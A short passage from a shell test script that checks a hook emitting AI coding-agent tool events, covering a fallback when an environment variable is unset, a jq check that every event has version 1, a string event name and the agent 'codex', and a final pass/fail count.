if osc_ok; then ok "fallback: HAUNT_SURFACE_ID unset"; else bad "fallback: HAUNT_SURFACE_ID unset"; fi

# Core compatibility: every body has v=1, a string event and agent "codex".
check "every event carries v=1, a string event and agent codex" "{$T,\"hook_event_name\":\"PostToolUse\",\"agent_id\":\"a\",\"tool_name\":\"update_plan\",\"tool_input\":{\"plan\":[]}}" \
    "all(.[]; .v == 1 and (.event | type) == \"string\" and .agent == \"codex\")"

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
